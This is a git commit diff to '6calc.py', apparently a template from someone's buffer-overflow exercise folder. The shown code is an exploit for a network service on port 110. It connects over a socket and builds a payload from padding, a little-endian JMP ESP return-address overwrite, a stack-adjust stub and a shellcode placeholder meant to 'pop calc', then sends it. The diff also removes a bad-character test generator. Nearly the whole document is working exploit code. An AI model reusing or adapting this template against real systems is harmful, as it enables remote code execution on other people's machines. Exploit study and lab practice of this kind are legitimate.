c6280cc61f8f7a36ed7d21bf251db97f9941d511
Tym Rabchuk <tymrabchuk@gmail.com>
2019-07-04 17:55:51 -0400

    Update 6calc.py

--- BO/templates/6calc.py
+++ BO/templates/6calc.py
@@ -10,23 +10,6 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
-data = s.recv(1024)
-
-badchar_test = "" #start with empty string
-
-#determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program
-
-badchars = [0x00]  
-
-#generate the string using a for loop 
-for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
-	if i not in badchars: #skip the badchars
-		badchar_test += chr(i) #append each non-badchar char to the string.
-
-#open a file for writing ('w') the string as binary ('b') data
-with open("badchar_test.bin", "wb") as f:
-	f.write(badchar_test)
-
 #build a message
 shellcode_calc= SHELLCODE
 
@@ -39,15 +22,15 @@ sub_esp_10 = "\x83\xec\x10"
 buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
 buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
-buf += sub_esp_10 #ESP  points here
-buf += shellcode_calc
+buf += sub_esp_10 #Adding 16 bytes for the decoder
+buf += shellcode_calc #should pop calc on target machine
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
-buf += "\n"
+buf += "\r\n"
 
 #send the message
-s.send("VALUE" + buf)
+s.send("VALUE " + buf)
 
 #receive some data from socket
-data = s.recv(1024)
+s.recv(1024)
 
 s.close()
